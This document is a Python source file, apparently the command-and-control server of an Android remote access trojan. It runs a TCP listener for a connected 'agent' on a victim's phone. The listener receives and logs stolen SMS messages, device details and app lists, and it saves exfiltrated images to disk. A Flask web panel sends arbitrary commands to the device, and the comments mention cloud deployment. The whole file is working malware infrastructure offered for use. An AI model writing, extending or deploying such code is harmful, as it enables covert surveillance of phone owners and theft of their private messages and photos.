import socket
import json
import threading
import base64
import os
import time
from flask import Flask, request, jsonify, render_template

# --- Globals & Setup ---
app = Flask(__name__)
client_socket = None
client_address = None
running = True
server_logs = []

# Bikin folder otomatis
for folder in ['captured_images', 'device_downloads', 'screen_recordings', 'gallery_downloads']:
    if not os.path.exists(folder): os.makedirs(folder)

def add_log(message):
    timestamp = time.strftime("%H:%M:%S")
    formatted_msg = f"[{timestamp}] {message}"
    print(formatted_msg)
    server_logs.append(formatted_msg)
    if len(server_logs) > 100: server_logs.pop(0)

# --- Data Handlers ---
def handle_incoming_data(data):
    try:
        payload = json.loads(data).get('data', {})
        log_type = payload.get('type', 'UNKNOWN')

        if log_type == 'SMS_LOG':
            log = payload.get('log', {})
            add_log(f"[SMS] {log.get('userSender')}: {log.get('content')}")
        elif log_type == 'DEVICE_INFO':
            info = payload.get('info', {})
            add_log(f"[INFO] {info.get('Model')} | {info.get('Battery')} | Android {info.get('AndroidVersion')}")
        elif log_type == 'IMAGE_DATA':
            filename = payload.get('image', {}).get('filename', f"img_{int(time.time())}.jpg")
            filepath = os.path.join('captured_images', filename)
            with open(filepath, 'wb') as f: f.write(base64.b64decode(payload.get('image', {}).get('image_base64', '')))
            add_log(f"[IMAGE] Saved to {filepath}")
        elif log_type == 'APP_LIST':
            add_log(f"[APPS] Found {len(payload.get('apps', []))} apps.")
        else:
            add_log(f"[RECV] {log_type}")
    except Exception as e:
        add_log(f"[ERROR] Parsing data: {e}")

# --- TCP Server (Background Thread) ---
def tcp_listener():
    global client_socket, client_address, running
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # FIX: Set TCP Port ke 1313
    tcp_port = 1313 
    server.bind(('0.0.0.0', tcp_port))
    server.listen(1)
    add_log(f"[*] TCP Server listening on port {tcp_port}")

    while running:
        try:
            server.settimeout(2.0)
            conn, addr = server.accept()
            client_socket, client_address = conn, addr
            add_log(f"[+] Agent Connected: {addr[0]}:{addr[1]}")
            
            buffer = ""
            while client_socket:
                try:
                    data = client_socket.recv(16384).decode('utf-8', errors='ignore')
                    if not data: break
                    buffer += data
                    while '\n' in buffer:
                        line, buffer = buffer.split('\n', 1)
                        if line.strip(): handle_incoming_data(line.strip())
                except Exception:
                    break
            add_log("[-] Agent Disconnected")
            client_socket, client_address = None, None
        except socket.timeout:
            continue
        except Exception as e:
            if running: add_log(f"[!] TCP Error: {e}")

# --- Web Routes ---
@app.route('/')
def index(): return render_template('index.html')

@app.route('/api/status')
def get_status():
    return jsonify({"connected": client_socket is not None, "address": client_address, "logs": server_logs})

@app.route('/api/command', methods=['POST'])
def send_command():
    global client_socket
    if not client_socket: return jsonify({"status": "error", "message": "No agent connected"}), 400
    cmd = request.json.get('cmd')
    if not cmd: return jsonify({"status": "error", "message": "Empty command"}), 400
    try:
        add_log(f"[SEND] {cmd}")
        client_socket.sendall(f"{cmd}\n".encode())
        return jsonify({"status": "success"})
    except Exception as e:
        client_socket = None
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    threading.Thread(target=tcp_listener, daemon=True).start()
    
    # FIX: Biarkan Railway yang menentukan port Web lewat environment variable. 
    # Fallback ke 1111 cuma kalau dijalanin di PC lu sendiri.
    web_port = int(os.environ.get("PORT", 1111))
    add_log(f"[*] Web Server starting on port {web_port}")
    app.run(host='0.0.0.0', port=web_port)
